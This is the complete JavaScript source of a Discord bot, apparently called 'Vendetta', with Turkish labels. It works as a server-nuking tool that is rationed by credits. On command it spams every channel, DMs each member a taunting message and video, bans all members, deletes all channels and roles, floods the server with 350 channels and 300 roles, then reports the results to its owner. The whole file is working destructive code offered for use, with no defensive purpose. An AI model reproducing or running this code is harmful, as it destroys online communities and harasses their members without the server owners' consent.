require('dotenv').config();
const {
Client, GatewayIntentBits, Partials,
EmbedBuilder, AttachmentBuilder,
ActionRowBuilder, ButtonBuilder, ButtonStyle,
ModalBuilder, TextInputBuilder, TextInputStyle
} = require('discord.js');

const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));

const client = new Client({
intents: [
GatewayIntentBits.Guilds,
GatewayIntentBits.GuildMessages,
GatewayIntentBits.MessageContent,
GatewayIntentBits.GuildMembers
],
partials: [Partials.Channel]
});

const OWNER_ID = process.env.OWNER_ID;
const SERI_ID = process.env.SERI_ID;
const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
const WHITELIST_KANAL_ID = process.env.WHITELIST_KANAL_ID;

let cachedVideo = null;
let haklar = {};
let haklarMessageId = null;

let whitelist = [];
let whitelistMessageId = null;

// ----------------------------------------------------------------------
// OWNER LOG
// ----------------------------------------------------------------------
async function sendVendettaLog(user, guild, bannedCount, kalanHak, sureMs) {
const owner = await client.users.fetch(OWNER_ID).catch(() => null);
if (!owner) return;

const embed = new EmbedBuilder()
.setColor("DarkRed")
.setTitle("💣 VENDETTA OPERASYON RAPORU")
.addFields(
{ name: "💣 İşlem Başlatan", value: ` ${user.tag} (${user.id}) ` },
{ name: "🏰 Sunucu", value: ${guild.name} (${guild.id}) },
{ name: "👑 Sunucu Sahibi", value: guild.ownerId ? <@${guild.ownerId}> : "Bulunamadı" },
{ name: "🔥 Banlanan", value: ${bannedCount} },
{ name: "💦 Kalan Hak", value: ${kalanHak} },
{ name: "⏱ Süre", value: ${(sureMs / 1000).toFixed(1)} saniye }
)
.setTimestamp();

owner.send({ embeds: [embed] }).catch(() => {});
}

// ----------------------------------------------------------------------
// WHITE ATTEMPT LOG
// ----------------------------------------------------------------------
async function sendWhitelistAttack(user, guild) {
const owner = await client.users.fetch(OWNER_ID).catch(() => null);
if (!owner) return;

const embed = new EmbedBuilder()
.setColor("Yellow")
.setTitle("⚠️ WHITELIST SALDIRI GİRİŞİMİ!")
.addFields(
{ name: "👤 Yapan", value: ${user.tag} (${user.id}) },
{ name: "🎯 Hedef", value: ${guild.name} (${guild.id}) },
{ name: "👑 Sunucu Sahibi", value: guild.ownerId ? <@${guild.ownerId}> : "Bulunamadı" }
)
.setTimestamp();

owner.send({ embeds: [embed] }).catch(() => {});
}

// ----------------------------------------------------------------------
// HAK MESAJI
// ----------------------------------------------------------------------
async function updateHaklarMessage(channel) {
let text = "🔥 KULLANICI HAK LİSTESİ 🔥\n\n";
for (const id in haklar) {
text += ${id} → ${haklar[id]} hak\n;
}

if (haklarMessageId) {
const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
if (msg) return msg.edit({ content: text });
}

const msg = await channel.send({ content: text });
haklarMessageId = msg.id;
}

// ----------------------------------------------------------------------
// WHITELIST MESAJI
// ----------------------------------------------------------------------
async function updateWhitelistMessage(channel) {
let text = "🛡️ WHITELIST SUNUCULAR 🛡️\n\n";

if (whitelist.length === 0) text += "Hiç whitelist yok.";

for (const id of whitelist) text += • ${id}\n;

if (whitelistMessageId) {
const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
if (msg) return msg.edit({ content: text });
}

const msg = await channel.send({ content: text });
whitelistMessageId = msg.id;
}

// ----------------------------------------------------------------------
// Video Cache
// ----------------------------------------------------------------------
client.once("ready", async () => {
console.log(🚀 Bot aktif: ${client.user.tag});

const videoURL = "https://raw.githubusercontent.com/ForsDev101/Securitybot/main/ssstik.io_goktug_twd_1763930201787.mp4";

try {
const res = await fetch(videoURL);
const buffer = Buffer.from(await res.arrayBuffer());
cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
console.log("🎥 Video cache hazır!");
} catch (err) {
console.log("❌ Video cache sorunu:", err);
}
});

// ----------------------------------------------------------------------
// HAK & WL KOMUTLARI
// ----------------------------------------------------------------------
client.on("messageCreate", async message => {
if (!message.guild || message.author.bot) return;

const args = message.content.trim().split(/ +/);
const cmd = args.shift()?.toLowerCase();

if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;

const hakChan = await client.channels.fetch(HAK_KANAL_ID);
const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);

// HAK VER
if (cmd === ".hakver") {
const id = args[0];
if (!id) return message.reply("ID gir kanka.");

const c = parseInt(args[1]) || 1;
haklar[id] = (haklar[id] || 0) + c;

await updateHaklarMessage(hakChan);

return message.reply("Hak verildi kanka 💦");
}

// HAK AL
if (cmd === ".hakal") {
const id = args[0];
const c = parseInt(args[1]) || 1;
haklar[id] = Math.max((haklar[id] || 0) - c, 0);

await updateHaklarMessage(hakChan);

return message.reply("Hak alındı.");
}

// WL EKLE
if (cmd === ".whitelist") {
const id = args[0];
if (!id) return message.reply("Sunucu ID gir.");

if (!whitelist.includes(id)) whitelist.push(id);

await updateWhitelistMessage(wChan);

return message.reply("Sunucu whitelist’e eklendi 🔐");
}

// WL SİL
if (cmd === ".wlal") {
const id = args[0];
whitelist = whitelist.filter(x => x !== id);

await updateWhitelistMessage(wChan);

return message.reply("Whitelist’ten silindi.");
}
});

// ----------------------------------------------------------------------
// VENDETTA KOMUTU
// ----------------------------------------------------------------------
client.on("messageCreate", async message => {
if (!message.guild || message.author.bot) return;

if (message.content.trim().toLowerCase() !== ".vendetta") return;

const hak = haklar[message.author.id] || 0;
if (hak <= 0) {
return message.author.send("❌ Vendetta hakkın yok kanka.").catch(() => {});
}

const btn = new ActionRowBuilder().addComponents(
new ButtonBuilder()
.setCustomId("sorguHak")
.setLabel("💣 Vendetta")
.setStyle(ButtonStyle.Danger)
);

message.author.send({
content: Vendetta hakkın: ${hak}\nBaşlatmak için butona bas.,
components: [btn]
}).catch(() => {});
});

// ----------------------------------------------------------------------
// INTERACTION — BUTTON / MODAL
// ----------------------------------------------------------------------
client.on("interactionCreate", async interaction => {
if (!interaction.isButton() && !interaction.isModalSubmit()) return;

if (interaction.isButton() && interaction.customId === "sorguHak") {
const userHak = haklar[interaction.user.id] || 0;
if (userHak <= 0)
return interaction.reply({ content: "❌ Hakkın yok!", ephemeral: true });

const modal = new ModalBuilder()
.setCustomId("modalSunucuID")
.setTitle("Vendetta Formu")
.addComponents(
new ActionRowBuilder().addComponents(
new TextInputBuilder()
.setCustomId("sunucuID")
.setLabel("Sunucu ID")
.setStyle(TextInputStyle.Short)
.setRequired(true)
)
);

return interaction.showModal(modal);
}

// ----------------------------------------------------------------------
// MODAL SUBMIT
// ----------------------------------------------------------------------
if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
const guildId = interaction.fields.getTextInputValue("sunucuID");

// WHITELIST CHECK
if (whitelist.includes(guildId)) {
const guild = client.guilds.cache.get(guildId);
await sendWhitelistAttack(interaction.user, guild || { name: "Bilinmiyor", id: guildId });

return interaction.reply({
content: "⛔ Bu sunucu whitelist’te kanka.",
ephemeral: true
});
}

const guild = client.guilds.cache.get(guildId);
if (!guild)
return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });

await interaction.reply({ content: "⚡ İşlem başlıyor...", ephemeral: true });

const start = Date.now();

// HAK DÜŞÜR
haklar[interaction.user.id]--;
const hakChan = await client.channels.fetch(HAK_KANAL_ID);
await updateHaklarMessage(hakChan);

// ----------------------------------------------------------------------
// BAŞLAMADAN TÜM KANALARA MESAJ AT
// ----------------------------------------------------------------------
try {
const allChannels = await guild.channels.fetch();
for (const [id, ch] of allChannels) {
if (ch && ch.send) {
ch.send("\nVENDETTA YÜKLENİYOR...\n████████░░ 89%\n").catch(() => {});
}
}
} catch {}

// ----------------------------------------------------------------------
// BAN
// ----------------------------------------------------------------------
const members = await guild.members.fetch();
await Promise.all(
members.map(m => {
if (m.user.bot) return;
if ([OWNER_ID, SERI_ID].includes(m.id)) return;

m.send({ embeds: [new EmbedBuilder()
.setColor("Red")
.setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
.setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦")
.setFooter({ text: "VENDETTA BURDAYDI 😈" })
], files: [cachedVideo] }).catch(() => {});

return m.ban().catch(() => {});
})
);

// KANAL SİL
const ch = await guild.channels.fetch();
await Promise.all(ch.map(c => c.delete().catch(() => {})));

// ROL SİL
const roles = await guild.roles.fetch();
await Promise.all(
roles
.filter(r => r.editable && r.id !== guild.id)
.map(r => r.delete().catch(() => {}))
);

// 350 KANAL
await Promise.all(
Array.from({ length: 350 }).map((_, i) =>
guild.channels.create({
name: ["VENDETTA💦", "EL KONULDU🔥", "VENDETTA BURDAYDI💝"][i % 3]
}).catch(() => {})
)
);

// 300 ROL
await Promise.all(
Array.from({ length: 300 }).map(() =>
guild.roles.create({
name: "VENDETTA 😜",
color: "#" + Math.floor(Math.random() * 16777215).toString(16)
}).catch(() => {})
)
);

// LOG
await sendVendettaLog(
interaction.user,
guild,
members.size,
haklar[interaction.user.id],
Date.now() - start
);

await interaction.followUp({
content: "⚡ İşlem tamamlandı!",
ephemeral: true
});

await guild.leave().catch(() => {});
}
});

client.login(process.env.BOT_TOKEN);

